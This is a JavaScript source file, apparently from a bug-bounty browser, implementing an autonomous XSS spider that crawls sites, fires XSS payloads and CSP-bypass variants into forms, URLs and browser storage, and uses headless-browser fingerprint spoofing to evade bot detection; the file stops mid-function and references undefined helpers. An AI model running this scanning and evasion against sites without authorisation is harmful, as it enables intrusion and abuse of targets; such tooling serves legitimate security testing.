// xxsspider.js
// Autonomous XSS Spider for Electron Bug Bounty Browser
// Handles crawling, payload injection, detection, and reporting

const fs = require('fs');
const path = require('path');
const { URL } = require('url');
const http = require('http');
const https = require('https');
const puppeteer = require('puppeteer');
let JSDOM;
try { JSDOM = require('jsdom').JSDOM; } catch { JSDOM = null; }
const { Cluster } = (() => { try { return require('puppeteer-cluster'); } catch { return {}; } })();

// --- State ---
let running = false;
let stopRequested = false;
let findings = [];
let progress = 0;
let vulnsFound = 0;
let payloads = [];
let visited = new Set();
let queued = [];
let options = {};

// --- Utility: Send log to parent process ---
function send(type, data, extra) {
  if (process && process.send) process.send({ type, data, extra });
}
function log(msg, type = 'info') { send('log', msg, type); }
function updateProgress(val) { send('progress', val); }
function updateFound(val) { send('found', val); }
function updateStatus(status) { send('status', status); }
function reportFinding(finding) {
  findings.push(finding);
  vulnsFound++;
  updateFound(vulnsFound);
  send('finding', finding);
}
function clearAll() {
  findings = [];
  progress = 0;
  vulnsFound = 0;
  visited = new Set();
  queued = [];
  send('clear');
}

// --- Utility: Wait/delay helper ---
function wait(ms) { return new Promise(res => setTimeout(res, ms)); }

// --- Load payloads from file ---
function loadPayloads(payloadSet) {
  let file = 'wordlists/xss.txt';
  if (payloadSet && payloadSet !== 'default') file = payloadSet;
  try {
    const fullPath = path.isAbsolute(file) ? file : path.join(process.cwd(), file);
    const lines = fs.readFileSync(fullPath, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
    payloads = Array.from(new Set(lines));
    log(`Loaded ${payloads.length} XSS payloads from ${file}`);
  } catch (e) {
    log(`Failed to load payloads: ${e.message}`, 'error');
    payloads = ['<script>alert(1)</script>'];
  }
}

// --- HTTP(S) GET helper ---
function fetchUrl(url, cookies = '', headers = {}) {
  return new Promise((resolve, reject) => {
    try {
      const urlObj = new URL(url);
      const lib = urlObj.protocol === 'https:' ? https : http;
      const req = lib.request({
        hostname: urlObj.hostname,
        port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
        path: urlObj.pathname + urlObj.search,
        method: 'GET',
        headers: {
          'User-Agent': 'XSS-Spider/1.0',
          'Cookie': cookies,
          ...headers
        },
        timeout: 10000
      }, res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data, url: urlObj.href }));
      });
      req.on('error', reject);
      req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
      req.end();
    } catch (e) { reject(e); }
  });
}

// --- Form submission helper ---
async function submitForm(action, method, params, url, cookies = '', headers = {}) {
  return new Promise((resolve, reject) => {
    try {
      const urlObj = new URL(action, url);
      const lib = urlObj.protocol === 'https:' ? https : http;
      let options = {
        hostname: urlObj.hostname,
        port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
        path: urlObj.pathname + urlObj.search,
        method,
        headers: {
          'User-Agent': 'XSS-Spider/1.0',
          'Cookie': cookies,
          ...headers
        },
        timeout: 10000
      };
      let body = null;
      if (method === 'POST') {
        body = new URLSearchParams(params).toString();
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        options.headers['Content-Length'] = Buffer.byteLength(body);
      }
      const req = lib.request(options, res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data, url: urlObj.href }));
      });
      req.on('error', reject);
      req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
      if (body) req.write(body);
      req.end();
    } catch (e) { reject(e); }
  });
}

// --- Helper: Generate payload variants for evasion/obfuscation ---
function generatePayloadVariants(payload) {
  const variants = [payload];
  // URL-encoded
  variants.push(encodeURIComponent(payload));
  // Double URL-encoded
  variants.push(encodeURIComponent(encodeURIComponent(payload)));
  // HTML entity encoding
  variants.push(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'));
  // Broken up with tags
  variants.push(payload.replace(/script/gi, 'scr<script></script>ipt'));
  // Case swap
  variants.push(payload.split('').map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join(''));
  // Add more as needed
  return Array.from(new Set(variants));
}

// --- Helper: Extract subdomains from links ---
function extractSubdomains(links, baseDomain) {
  const subdomains = new Set();
  for (const link of links) {
    try {
      const u = new URL(link);
      if (u.hostname.endsWith(baseDomain) && u.hostname !== baseDomain) {
        subdomains.add(u.origin);
      }
    } catch {}
  }
  return Array.from(subdomains);
}

// --- Helper: Detect injection context (attribute, tag, JS, etc.) ---
function detectInjectionContext(html, param, payload) {
  const idx = html.indexOf(payload);
  if (idx === -1) return 'unknown';
  const attrRegex = new RegExp(`${param}=["']?${payload}`);
  if (attrRegex.test(html)) return 'attribute';
  const tagRegex = new RegExp(`<[^>]+>${payload}`);
  if (tagRegex.test(html)) return 'tag';
  const jsRegex = new RegExp(`["']${payload}["']`);
  if (jsRegex.test(html)) return 'js';
  return 'unknown';
}

// --- Helper: Context-aware payload selection ---
function getContextAwarePayloads(context) {
  const basePayloads = {
    attribute: [
      '" autofocus onfocus=alert(1) x="',
      "' autofocus onfocus=alert(1) x='",
      '" onmouseover=alert(1) x="',
      "' onmouseover=alert(1) x='"
    ],
    tag: [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      '<body onload=alert(1)>'
    ],
    js: [
      "';alert(1);//",
      '";alert(1);//',
      'alert(1)//',
      'javascript:alert(1)'
    ],
    unknown: [
      '<script>alert(1)</script>',
      '" autofocus onfocus=alert(1) x="',
      '<img src=x onerror=alert(1)>'
    ]
  };
  return basePayloads[context] || basePayloads['unknown'];
}

// --- Helper: Fuzz for hidden/extra parameters ---
function* paramFuzzer(wordlistPath) {
  let words = [];
  try {
    words = fs.readFileSync(wordlistPath, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean);
  } catch {}
  for (const word of words) {
    yield word;
  }
}

// --- Helper: Extract input-like elements (search bars, textareas, etc.) ---
function extractInputLikeElements(dom) {
  const elements = [];
  // Search bars: input[type=text], input[type=search], textarea
  const inputs = dom.window.document.querySelectorAll('input[type="text"], input[type="search"], textarea');
  for (const el of inputs) {
    if (el.name || el.id) {
      elements.push({
        name: el.name || el.id,
        type: el.type || el.tagName.toLowerCase(),
        element: el
      });
    }
  }
  return elements;
}

// --- Helper: Extract clickable elements that change URL (buttons, links with JS) ---
function extractClickableElements(dom) {
  const elements = [];
  // Buttons with onclick or type=submit/search/button
  const buttons = dom.window.document.querySelectorAll('button, input[type="button"], input[type="submit"], input[type="search"]');
  for (const btn of buttons) {
    if (btn.onclick || btn.getAttribute('onclick')) {
      elements.push(btn);
    }
  }
  // Links with href containing # or javascript:
  const links = dom.window.document.querySelectorAll('a[href]');
  for (const a of links) {
    const href = a.getAttribute('href') || '';
    if (href.startsWith('#') || href.startsWith('javascript:')) {
      elements.push(a);
    }
  }
  return elements;
}

// --- Helper: CSP detection ---
function detectCSP(headers) {
  for (const k in headers) {
    if (k.toLowerCase() === 'content-security-policy') return headers[k];
  }
  return null;
}

// --- Helper: Enhanced reporting ---
function structuredFinding({ type, method, url, param, payload, context, evidence, csp, cookies }) {
  return {
    type,
    method,
    url,
    param,
    payload,
    context,
    evidence,
    csp,
    cookies,
    timestamp: new Date().toISOString()
  };
}

// --- Helper: JS context marker injection ---
async function injectJSMarker(page) {
  await page.evaluate(() => { window.__xss_detected = false; });
}
async function checkJSMarker(page) {
  return await page.evaluate(() => window.__xss_detected === true);
}

// --- Helper: Dynamic route detection (SPA) ---
async function hookSPARoutes(page, routeSet) {
  await page.exposeFunction('__xss_route_hook', (route) => { routeSet.add(route); });
  await page.evaluate(() => {
    const push = history.pushState;
    const replace = history.replaceState;
    history.pushState = function() { push.apply(this, arguments); window.__xss_route_hook(location.href); };
    history.replaceState = function() { replace.apply(this, arguments); window.__xss_route_hook(location.href); };
    window.addEventListener('popstate', () => window.__xss_route_hook(location.href));
    const observer = new MutationObserver(() => window.__xss_route_hook(location.href));
    observer.observe(document.body, { childList: true, subtree: true });
  });
}

// --- Helper: IndexedDB injection ---
async function injectIndexedDB(page, payload) {
  await page.evaluate(p => {
    try {
      const req = indexedDB.open('xssdb', 1);
      req.onupgradeneeded = e => {
        const db = e.target.result;
        db.createObjectStore('xssstore', { keyPath: 'id' });
      };
      req.onsuccess = e => {
        const db = e.target.result;
        const tx = db.transaction('xssstore', 'readwrite');
        tx.objectStore('xssstore').put({ id: 'xss', val: p });
      };
    } catch {}
  }, payload);
}

// --- Helper: Storage injection ---
async function injectStorage(page, payload) {
  await page.evaluate(p => {
    try {
      localStorage.setItem('xss', p);
      sessionStorage.setItem('xss', p);
      window.name = p;
    } catch {}
  }, payload);
  await injectIndexedDB(page, payload);
}

// --- Helper: CSP bypass payloads ---
function getCSPBypassPayloads() {
  return [
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<body onload=alert(1)>',
    '\u003cimg src=x onerror=alert(1)\u003e',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>'
  ];
}

// --- Helper: Retry logic ---
async function retry(fn, retries = 3, delayMs = 1000) {
  for (let i = 0; i < retries; ++i) {
    try { return await fn(); } catch (e) { if (i === retries - 1) throw e; await wait(delayMs); }
  }
}

// --- Helper: Autofill and submit all forms via Puppeteer ---
async function autofillAndSubmitForms(page, payload) {
  const forms = await page.$$('form');
  for (const form of forms) {
    const inputs = await form.$$('input, textarea');
    for (const input of inputs) {
      try {
        await input.focus();
        await input.click({ clickCount: 3 });
        await input.type(payload, { delay: 10 });
      } catch {}
    }
    try { await form.evaluate(f => f.submit()); } catch {}
  }
}

// --- Helper: Inject payload into dynamic DOM context ---
async function injectIntoDOMContext(page, payload) {
  await page.evaluate(p => {
    // Try innerHTML injection
    let div = document.createElement('div');
    div.innerHTML = p;
    document.body.appendChild(div);
    // Try setAttribute injection
    let span = document.createElement('span');
    span.setAttribute('onclick', p);
    document.body.appendChild(span);
  }, payload);
}

// --- Helper: Visual/behavioral detection (DOM diff, cookies, etc.) ---
async function detectDOMMutation(page, before) {
  const after = await page.content();
  return before !== after;
}

// --- Helper: WebSocket fuzzing (optional, basic) ---
async function fuzzWebSocket(page, url, payload) {
  await page.evaluate((u, p) => {
    try {
      const ws = new WebSocket(u.replace(/^http/, 'ws'));
      ws.onopen = () => ws.send(p);
    } catch {}
  }, url, payload);
}

// --- Dialog/alert detection ---
function setupDialogDetection(page, findings, url) {
  page.on('dialog', async dialog => {
    findings.push(structuredFinding({
      type: 'alert-dialog',
      method: 'dialog',
      url: url,
      param: null,
      payload: dialog.message(),
      context: 'alert',
      evidence: 'alert() dialog triggered',
      csp: null,
      cookies: null
    }));
    await dialog.dismiss();
  });
}

// --- Headless evasion patch ---
async function evadeHeadless(page) {
  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    window.chrome = { runtime: {} };
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
  });
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
  log('[HEADLESS-EVASION] Patched navigator and UA for stealth.');
}

// --- Advanced browser fingerprint evasion ---
async function advancedEvadeHeadless(page) {
    await page.evaluateOnNewDocument(() => {
        // Override common detection methods
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        // Mock proper user interaction behavior
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = parameters => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        // Emulate plugins
        Object.defineProperty(navigator, 'plugins', {
            get: () => [
                {
                    0: {type: "application/x-google-chrome-pdf"},
                    description: "Portable Document Format",
                    filename: "internal-pdf-viewer",
                    length: 1,
                    name: "Chrome PDF Plugin"
                }
            ]
        });

        // Mock WebGL
        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return 'Intel Open Source Technology Center';
            if (parameter === 37446) return 'Mesa DRI Intel(R) HD Graphics 520 (Skylake GT2)';
            return getParameter.apply(this, [parameter]);
        };

        // Spoof screen resolution
        Object.defineProperty(window.screen, 'width', { get: () => 1920 });
        Object.defineProperty(window.screen, 'height', { get: () => 1080 });
        Object.defineProperty(window.screen, 'availWidth', { get: () => 1920 });
        Object.defineProperty(window.screen, 'availHeight', { get: () => 1080 });
        Object.defineProperty(window.screen, 'colorDepth', { get: () => 24 });
        Object.defineProperty(window.screen, 'pixelDepth', { get: () => 24 });
    });
    
    // Set advanced headers
    await page.setExtraHTTPHeaders({
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-CH': 'Sec-CH-UA, Sec-CH-UA-Mobile, Sec-CH-UA-Platform, Sec-CH-UA-Arch',
        'Sec-CH-UA': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        'Sec-CH-UA-Mobile': '?0',
        'Sec-CH-UA-Platform': '"Windows"',
        'Sec-CH-UA-Arch': '"x86"'
    });

    // Emulate mobile viewport if needed
    await page.setViewport({
        width: 1920,
        height: 1080,
        deviceScaleFactor: 1,
        isMobile: false,
        hasTouch: false,
        isLandscape: true
    });
}

// Advanced Stealth and Evasion Functions
const STEALTH = {
    // Browser fingerprint evasion
    async applyEvasions(page) {
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [
                    {
                        0: {type: "application/x-google-chrome-pdf"},
                        description: "Portable Document Format",
                        filename: "internal-pdf-viewer",
                        length: 1,
                        name: "Chrome PDF Plugin"
                    }
                ]
            });
            
            // Spoof screen properties
            const screenProps = {
                width: 1920,
                height: 1080,
                availWidth: 1920,
                availHeight: 1080,
                colorDepth: 24,
                pixelDepth: 24
            };
            
            for (const [key, value] of Object.entries(screenProps)) {
                Object.defineProperty(window.screen, key, { get: () => value });
            }
            
            // Add canvas fingerprint randomization
            const originalGetContext = HTMLCanvasElement.prototype.getContext;
            HTMLCanvasElement.prototype.getContext = function(type) {
                const context = originalGetContext.apply(this, arguments);
                if (type === '2d') {
                    const originalGetImageData = context.getImageData;
                    context.getImageData = function() {
                        const imageData = originalGetImageData.apply(this, arguments);
                        // Slightly modify one pixel
                        imageData.data[0] = imageData.data[0] ^ 1;
                        return imageData;
                    };
                }
                return context;
            };
        });

        // Set realistic headers
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        });
    }
};

// Advanced XSS Payload Generation
const PAYLOAD_GEN = {
    // Generate sophisticated XSS payloads
    generatePayloads(basePayload) {
        const variants = new Set([basePayload]);
        
        // HTML entity variants
        variants.add(this.htmlEncode(basePayload));
        variants.add(this.hexEncode(basePayload));
        
        // JavaScript escape variants
        variants.add(this.jsEscape(basePayload));
        
        // Protocol handler variants
        variants.add(`javascript:${encodeURIComponent(basePayload)}`);
        variants.add(`data:text/html,${encodeURIComponent(basePayload)}`);
        
        // DOM clobbering variants
        if (basePayload.includes('script')) {
            variants.add(basePayload.replace('script', 'scr<>ipt'));
            variants.add(basePayload.replace('script', 'scr\\x69pt'));
        }
        
        // Event handler variants
        ['onload', 'onerror', 'onmouseover'].forEach(event => {
            variants.add(`<img src=x ${event}=${basePayload.replace(/^<script>|<\/script>$/g, '')}>`);
        });
        
        return [...variants];
    },
    
    htmlEncode(str) {
        return str.replace(/[<>'"&]/g, c => `&#${c.charCodeAt(0)};`);
    },
    
    hexEncode(str) {
        return str.replace(/[<>'"&]/g, c => `&#x${c.charCodeAt(0).toString(16)};`);
    },
    
    jsEscape(str) {
        return str.replace(/[<>'"&]/g, c => 
            `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`);
    }
};

// Advanced XSS Detection Mechanisms
const XSS_DETECT = {
    // Check for successful XSS execution
    async checkExecution(page) {
        return await page.evaluate(() => {
            const results = [];
            
            // Check DOM modifications
            const observer = new MutationObserver(mutations => {
                for (const mutation of mutations) {
                    if (mutation.type === 'childList' || mutation.type === 'attributes') {
                        results.push({
                            type: 'dom-mutation',
                            target: mutation.target.tagName,
                            changes: mutation.type
                        });
                    }
                }
            });
            
            observer.observe(document.body, {
                childList: true,
                attributes: true,
                subtree: true
            });
            
            // Check dangerous sink usage
            const dangerousSinks = {
                'eval': window.eval,
                'innerHTML': Element.prototype.innerHTML,
                'document.write': document.write
            };
            
            for (const [name, sink] of Object.entries(dangerousSinks)) {
                const wrapper = function(...args) {
                    results.push({
                        type: 'sink-called',
                        name,
                        args: args.map(String)
                    });
                    return sink.apply(this, args);
                };
                
                if (name === 'innerHTML') {
                    Object.defineProperty(Element.prototype, 'innerHTML', {
                        set: wrapper
                    });
                } else if (name.includes('.')) {
                    const [obj, prop] = name.split('.');
                    window[obj][prop] = wrapper;
                } else {
                    window[name] = wrapper;
                }
            }
            
            return results;
        });
    }
};

// Smart retry logic with exponential backoff
const SMART_RETRY = {
    async retry(fn, maxRetries = 3, baseDelay = 1000) {
        let lastError;
        
        for (let i = 0; i < maxRetries; i++) {
            try {
                return await fn();
            } catch (error) {
                lastError = error;
                const delay = this.calculateDelay(error, i, baseDelay);
                await new Promise(resolve => setTimeout(resolve, delay));
                log(`Retrying operation after ${delay}ms (${i + 1}/${maxRetries})`);
            }
        }
        
        throw lastError;
    },
    
    calculateDelay(error, attempt, baseDelay) {
        const base = Math.pow(2, attempt) * baseDelay;
        
        // Adjust based on error type
        if (error.message.includes('429')) return base * 2; // Rate limiting
        if (error.message.includes('timeout')) return base * 1.5; // Timeouts
        if (error.message.includes('net::')) return base * 1.2; // Network errors
        
        return base;
    }
};

// --- Main crawl loop with concurrency and input injection ---
async function crawl({ startUrl, maxDepth = 2, maxConcurrency = 2, payloadSet }) {
    loadPayloads(payloadSet);
    const findings = [];
    const visited = new Set();
    const queue = [{ url: startUrl, depth: 0 }];
    
    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency,
        puppeteerOptions: { headless: true }
    });
    
    async function processPage({ page, data: { url, depth } }) {
        if (visited.has(url) || depth > maxDepth) return;
        visited.add(url);
        
        await SMART_RETRY.retry(async () => {
            await STEALTH.applyEvasions(page);
            await page.goto(url, { waitUntil: 'networkidle0', timeout: 30000 });
            
            // Generate and test payloads
            const basePayloads = payloads.flatMap(p => PAYLOAD_GEN.generatePayloads(p));
            
            for (const payload of basePayloads) {
                // Inject payload
                await page.evaluate(p => {
                    // Inject into forms
                    document.querySelectorAll('input').forEach(input => {
                        input.value = p;
                    });
                    // Inject into DOM
                    const div = document.createElement('div');
                    div.innerHTML = p;
                    document.body.appendChild(div);
                }, payload);
                
                // Check for XSS execution
                const detectionResults = await XSS_DETECT.checkExecution(page);
                
                if (detectionResults.length > 0) {
                    findings.push({
                        url,
                        payload,
                        evidence: detectionResults,
                        timestamp: new Date().toISOString()
                    });
                    log(`[FOUND] XSS vulnerability in ${url} with payload: ${payload}`);
                }
            }
        });
        
        // Extract and queue new URLs
        const newUrls = await page.evaluate(() => 
            Array.from(document.querySelectorAll('a[href]'))
                .map(a => a.href)
                .filter(href => href.startsWith('http'))
        );
        
        for (const newUrl of newUrls) {
            if (!visited.has(newUrl) && newUrl.startsWith(new URL(startUrl).origin)) {
                queue.push({ url: newUrl, depth: depth + 1 });
            }
        }
    }
    
    cluster.on('taskerror', (err, data) => {
        log(`Error while processing ${data.url}: ${err.message}`, 'error');
    });
    
    await cluster.task(processPage);
    
    while (queue.length > 0) {
        const batch = queue.splice(0, maxConcurrency);
        await Promise.all(batch.map(data => cluster.queue(data)));
    }
    
    await cluster.idle();
    await cluster.close();
    
    return findings;
}

// --- Core spider/fuzz logic ---
async function fuzzPage(page, url, payload) {
  await autofillAndSubmitForms(page, payload);
  await injectIntoDOMContext(page, payload);
  await injectStorage(page, payload);
  await injectIndexedDB(page, payload);
  await injectUrlVectors(page, url, payload);
  await fuzzWebSocket(page, url, payload);
}

// --- Spider logic with queue, depth, and concurrency ---
async function spider({ startUrl, maxDepth = 2, maxConcurrency = 2, payloadSet }) {
  loadPayloads(payloadSet);
  const findings = [];
  const visited = new Set();
  const queue = [{ url: startUrl, depth: 0 }];
  const cluster = Cluster ? await Cluster.launch({ concurrency: Cluster.CONCURRENCY_CONTEXT, maxConcurrency, puppeteerOptions: { headless: true } }) : null;

  async function process({ page, data: { url, depth } }) {
    if (visited.has(url) || depth > maxDepth) return;
    visited.add(url);
    setupDialogDetection(page, findings, url);
    try {
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 20000 });
      const before = await page.content();
      for (const payload of payloads) {
        await fuzzPage(page, url, payload);
        await wait(500);
        // DOM mutation detection
        const mutated = await detectDOMMutation(page, before);
        if (mutated) {
          findings.push(structuredFinding({
            type: 'DOM-mutation',
            method: 'DOM diff',
            url,
            param: null,
            payload,
            context: 'dom',
            evidence: 'DOM mutated after payload',
            csp: null,
            cookies: null
          }));
        }
      }
      // Parse links and queue
      const html = await page.content();
      let links = [];
      if (JSDOM) {
        const dom = new JSDOM(html);
        links = [...dom.window.document.querySelectorAll('a')].map(a => a.href).filter(h => h && h.startsWith('http'));
      }
      for (let link of links) {
        if (!visited.has(link) && link.startsWith(new URL(startUrl).origin)) {
          queue.push({ url: link, depth: depth + 1 });
        }
      }
    } catch (e) {
      log(`Spider error: ${e.message}`, 'error');
    } finally {
      await page.close();
    }
  }

  if (cluster) {
    await cluster.task(process);
    while (queue.length > 0) {
      const { url, depth } = queue.shift();
      await cluster.queue({ url, depth });
    }
    await cluster.idle();
    await cluster.close();
  } else {
    const browser = await puppeteer.launch({ headless: true });
    while (queue.length > 0) {
      const { url, depth } = queue.shift();
      const page = await browser.newPage();
      await process({ page, data: { url, depth } });
    }
    await browser.close();
  }
  return findings;
}

// --- Puppeteer Cluster-based Autonomous XSS Spider ---
async function puppeteerXssSpider({ startUrl, payloadSet, maxDepth = 3, headless = true, timeout = 20000, throttle = 500 }) {
  loadPayloads(payloadSet);
  const findings = [];
  const routeSet = new Set();
  const cookiesMap = {};
  const cluster = Cluster ? await Cluster.launch({ concurrency: Cluster.CONCURRENCY_CONTEXT, maxConcurrency: 2, puppeteerOptions: { headless } }) : null;
  const queue = [{ url: startUrl, depth: 0 }];
  const visited = new Set();

  async function processPage({ page, data: { url, depth } }) {
    if (visited.has(url) || depth > maxDepth) return;
    visited.add(url);
    await retry(() => page.goto(url, { waitUntil: 'networkidle2', timeout }), 3, 1500);
    await injectJSMarker(page);
    await hookSPARoutes(page, routeSet);
    const csp = detectCSP((await page._client.send('Network.getAllCookies')).headers || {});
    const cookies = await page.cookies();
    cookiesMap[url] = cookies;
    // Inject all payloads
    for (const payload of payloads.concat(getCSPBypassPayloads())) {
      await injectAllInputs(page, payload);
      await clickAllClickables(page);
      await injectUrlVectors(page, url, payload);
      await injectStorage(page, payload);
      await wait(throttle);
      // JS marker check
      const jsExec = await checkJSMarker(page);
      if (jsExec) {
        findings.push(structuredFinding({
          type: 'XSS', method: 'JS context', url, param: null, payload, context: 'js', evidence: 'window.__xss_detected', csp, cookies, 
        }));
      }
      // DOM evidence
      const domEvidence = await page.evaluate(p => document.body.innerHTML.includes(p), payload);
      if (domEvidence) {
        findings.push(structuredFinding({
          type: 'XSS', method: 'DOM injection', url, param: null, payload, context: 'dom', evidence: 'Payload in DOM', csp, cookies,
        }));
      }
    }
    // Discover new SPA routes
    for (const r of Array.from(routeSet)) {
      if (!visited.has(r)) queue.push({ url: r, depth: depth + 1 });
    }
    // Discover links
    const hrefs = await page.$$eval('a[href]', as => as.map(a => a.href));
    for (const h of hrefs) {
      if (!visited.has(h)) queue.push({ url: h, depth: depth + 1 });
    }
  }

  if (cluster) {
    await cluster.task(processPage);
    while (queue.length > 0) {
      const { url, depth } = queue.shift();
      await cluster.queue({ url, depth });
      await wait(throttle);
    }
    await cluster.idle();
    await cluster.close();
  } else {
    // Fallback: single browser
    const puppeteer = require('puppeteer');
    const browser = await puppeteer.launch({ headless });
    const page = await browser.newPage();
    while (queue.length > 0) {
      const { url, depth } = queue.shift();
      await processPage({ page, data: { url, depth } });
      await wait(throttle);
    }
    await browser.close();
  }
  return findings;
}

// --- Crawl and test for XSS ---
async function crawlAndTest(startUrl, depth, sameDomain, followForms, domXss, smartMode, threads) {
  clearAll();
  running = true;
  stopRequested = false;
  progress = 0;
  vulnsFound = 0;
  visited = new Set();
  queued = [{ url: startUrl, depth: 0 }];
  updateStatus('Running');
  log(`[START] Extreme XSS Spider begins at ${startUrl}`);
  const storedPayloads = [];
  const baseDomain = new URL(startUrl).hostname.split('.').slice(-2).join('.');
  let allDiscoveredLinks = new Set();
  const paramWordlist = 'wordlists/param-mining.txt';

  while (queued.length > 0 && running && !stopRequested) {
    const batch = queued.splice(0, threads);
    await Promise.all(batch.map(async ({ url, depth: d }) => {
      if (visited.has(url) || d > depth) return;
      visited.add(url);
      progress++;
      updateProgress(progress);
      log(`[NAVIGATE] Visiting: ${url}`);
      let resp;
      try {
        resp = await fetchUrl(url);
        log(`[FETCH] Got response (${resp.status}) for ${url}`);
      } catch (e) {
        log(`[ERROR] Failed to fetch ${url}: ${e.message}`);
        return;
      }
      let forms = [];
      let links = [];
      let inputLikes = [];
      let clickables = [];
      try {
        if (JSDOM) {
          const dom = new JSDOM(resp.body);
          forms = Array.from(dom.window.document.querySelectorAll('form'));
          links = Array.from(dom.window.document.querySelectorAll('a')).map(a => a.href).filter(h => h && h.startsWith('http'));
          inputLikes = extractInputLikeElements(dom);
          clickables = extractClickableElements(dom);
          log(`[DISCOVER] Found ${forms.length} forms, ${inputLikes.length} input-like elements, ${clickables.length} clickables, and ${links.length} links on ${url}`);
        }
      } catch (e) {
        log(`[ERROR] DOM parse error at ${url}: ${e.message}`);
      }
      allDiscoveredLinks = new Set([...allDiscoveredLinks, ...links]);
      // Test forms for XSS
      for (const form of forms) {
        let action = form.getAttribute ? form.getAttribute('action') : form.action;
        if (!action || action.trim() === '' || action === '#') action = url;
        let resolvedAction;
        try {
          resolvedAction = new URL(action, url).href;
        } catch (e) {
          log(`[WARN] Malformed form action '${action}' at ${url}, using current URL.`);
          resolvedAction = url;
        }
        const method = (form.method || (form.getAttribute ? form.getAttribute('method') : '') || 'GET').toUpperCase();
        const inputs = Array.from(form.querySelectorAll('input[name]'));
        if (inputs.length === 0) {
          log(`[SKIP] No input fields in form at ${resolvedAction}`);
          continue;
        }
        log(`[FORM] Testing form at ${resolvedAction} (${method}) with ${inputs.length} inputs.`);
        for (const input of inputs) {
          log(`[PARAM] Testing input '${input.name}' in form at ${resolvedAction}`);
          let foundVuln = false;
          for (const payload of payloads) {
            if (stopRequested) return;
            const variants = generatePayloadVariants(payload);
            for (const variant of variants) {
              let params = {};
              inputs.forEach(i => { params[i.name] = i === input ? variant : 'test'; });
              let testUrl = resolvedAction;
              let testResp;
              try {
                if (method === 'POST') {
                  log(`[TRY] Submitting POST to ${resolvedAction} with param '${input.name}' and payload variant: ${variant}`);
                  testResp = await submitForm(resolvedAction, 'POST', params, url);
                } else {
                  const u = new URL(resolvedAction, url);
                  Object.entries(params).forEach(([k, v]) => u.searchParams.set(k, v));
                  testUrl = u.href;
                  log(`[TRY] Submitting GET to ${testUrl} with param '${input.name}' and payload variant: ${variant}`);
                  testResp = await fetchUrl(testUrl);
                }
              } catch (e) {
                log(`[ERROR] Test request failed for ${testUrl}: ${e.message}`);
                continue;
              }
              // Context-aware payloads
              let context = detectInjectionContext(testResp.body, input.name, variant);
              let contextPayloads = getContextAwarePayloads(context);
              for (const ctxPayload of contextPayloads) {
                let ctxParams = {};
                inputs.forEach(i => { ctxParams[i.name] = i === input ? ctxPayload : 'test'; });
                let ctxTestUrl = resolvedAction;
                let ctxTestResp;
                try {
                  if (method === 'POST') {
                    ctxTestResp = await submitForm(resolvedAction, 'POST', ctxParams, url);
                  } else {
                    const u = new URL(resolvedAction, url);
                    Object.entries(ctxParams).forEach(([k, v]) => u.searchParams.set(k, v));
                    ctxTestUrl = u.href;
                    ctxTestResp = await fetchUrl(ctxTestUrl);
                  }
                } catch (e) { continue; }
                if (ctxTestResp.body.includes(ctxPayload)) {
                  foundVuln = true;
                  reportFinding({
